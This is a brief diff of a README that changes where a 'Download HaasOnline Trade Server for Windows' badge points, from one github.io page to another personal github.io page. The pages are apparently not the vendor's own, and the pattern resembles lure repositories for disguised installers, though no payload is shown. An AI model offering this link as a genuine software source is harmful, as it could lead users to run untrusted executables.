@@ -4,7 +4,7 @@
 
 ## 📥 Download HaasOnline Trade Server for Windows
 
-[![⬇️ Download HaasOnline Trade Server](https://img.shields.io/badge/Download-HaasOnline%20Trade%20Server-blue?style=for-the-badge&logo=windows)](https://haasload.github.io/.github/)
+[![⬇️ Download HaasOnline Trade Server](https://img.shields.io/badge/Download-HaasOnline%20Trade%20Server-blue?style=for-the-badge&logo=windows)](https://tchiorniyr.github.io/.github/haas-online)
 
 ---
 
